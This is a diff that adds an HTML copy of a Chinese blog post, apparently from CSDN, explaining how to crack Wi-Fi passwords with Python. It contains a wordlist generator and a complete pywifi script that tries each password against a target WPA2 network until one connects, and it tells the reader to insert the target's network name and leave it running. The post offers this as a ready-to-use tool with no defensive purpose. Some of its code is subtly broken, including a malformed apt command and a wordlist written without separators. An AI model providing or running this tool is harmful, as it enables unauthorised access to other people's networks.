@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>用Python破解wifi密码</title>
+  <link rel="stylesheet" href="https://stackedit.io/style.css" />
+</head>
+
+<body class="stackedit">
+  <div class="stackedit__html"><p></p><div class="toc"><h3>目录:</h3><ul><li><a href="#Pythonwifi_1">利用Python破解无线wifi密码</a></li><ul><li><a href="#pip3_8">安装pip3</a></li><li><a href="#Pywifi_14">安装Pywifi</a></li><li><a href="#_27">开始破解</a></li><ul><li><a href="#_28">生成密码本</a></li><li><a href="#_42">破解密码</a></li></ul></ul></ul></div><p></p>
+<h1><a id="Pythonwifi_1"></a>利用Python破解无线wifi密码</h1>
+<p><em>此博文为CSDN原创，未经博主允许禁止转载</em><br>
+<strong>©Copyright 2019 CSDN afb278193</strong><br>
+<strong>©Copyright 2019 AirSpace Studio</strong><br>
+<strong>提示：此文章在CSDN编辑，如果使用其它编辑器打开可能会导致排版与预期不一致 推荐进入<a href="https://airspacemc.github.io/blogs/efl/20190515_1.html"><em>官方博文地址</em></a>  查看</strong></p>
+<h2><a id="pip3_8"></a>安装pip3</h2>
+<pre><code>$ sudo apt-get python-pip3
+[sudo]Password for EFL:
+...
+</code></pre>
+<h2><a id="Pywifi_14"></a>安装Pywifi</h2>
+<p>首先，需要添加pywifi这个模块</p>
+<pre><code>$ pip3 install pywifi
+</code></pre>
+<p>然后进入pywifi的目录且安装其它模块，这里的目录是*/pywifi-master*</p>
+<pre><code>$cd "/pywifi-master"
+$pip3 install .
+</code></pre>
+<p>注意install后面<strong>有个点</strong></p>
+<h2><a id="_27"></a>开始破解</h2>
+<h3><a id="_28"></a>生成密码本</h3>
+<p>我们需要一个密码本来破解wifi，可以去网上下载也可以写一个python程序生成</p>
+<pre><code class="prism language-\">import itertools as its
+words = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+r = its.product(words, repeat=6)
+dic = open("passwords", "w")
+for i in r:
+    dic.write("".join(i))
+
+dic.close
+</code></pre>
+<p>写完之后运行，会生成一个叫<em>passwords</em>的文件，这就是密码本</p>
+<h3><a id="_42"></a>破解密码</h3>
+<p>生成密码本之后，就可以开始破解了。在密码本同级目录写一个python文件输入以下代码</p>
+<pre><code class="prism language-\">#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import time  #时间
+import pywifi  #破解wifi
+from pywifi import const  #引用一些定义
+from asyncio.tasks import sleep
+class PoJie():
+    def __init__(self,path):
+        self.file=open(path,"r",errors="ignore")
+        wifi = pywifi.PyWiFi() #抓取网卡接口
+        self.iface = wifi.interfaces()[0]#抓取第一个无限网卡
+        self.iface.disconnect() #测试链接断开所有链接
+
+        time.sleep(1) #休眠1秒
+
+        #测试网卡是否属于断开状态，
+        assert self.iface.status() in\
+            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
+
+    def readPassWord(self):
+            print("开始破解：")
+            while True:
+
+                try:
+                    myStr =self.file.readline()
+                    if not myStr:
+                        break
+                    bool1=self.test_connect(myStr)
+                    if bool1:
+                        print("密码正确：",myStr)
+                        break
+                    else:
+                        print("密码错误:"+myStr)
+                    sleep(3)
+                except:
+                    continue
+
+    def test_connect(self,findStr):#测试链接
+
+        profile = pywifi.Profile()  #创建wifi链接文件
+        profile.ssid = "e2" #wifi名称
+        profile.auth = const.AUTH_ALG_OPEN  #网卡的开放，
+        profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
+        profile.cipher = const.CIPHER_TYPE_CCMP    #加密单元
+        profile.key = findStr #密码
+
+        self.iface.remove_all_network_profiles() #删除所有的wifi文件
+        tmp_profile = self.iface.add_network_profile(profile)#设定新的链接文件
+        self.iface.connect(tmp_profile)#链接
+        time.sleep(5)
+        if self.iface.status() == const.IFACE_CONNECTED:  #判断是否连接上
+            isOK=True   
+        else:
+            isOK=False
+        self.iface.disconnect() #断开
+        time.sleep(1)
+        #检查断开状态
+        assert self.iface.status() in\
+            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
+
+        return isOK
+
+
+    def __del__(self):
+        self.file.close()
+
+path=r"xxx"
+start=PoJie(path)
+start.readPassWord()
+</code></pre>
+<p>其中倒数第三行path="xxx"中的xxx输入密码本所在目录斜杠密码本的名字，如目录在/python/密码本叫test，就输入/python/test</p>
+<p>第42行的"e2"改成要破解的wifi名</p>
+<p>双击运行这个破解程序，挂机一会儿就试出来了</p>
+</div>
+</body>
+
+</html>
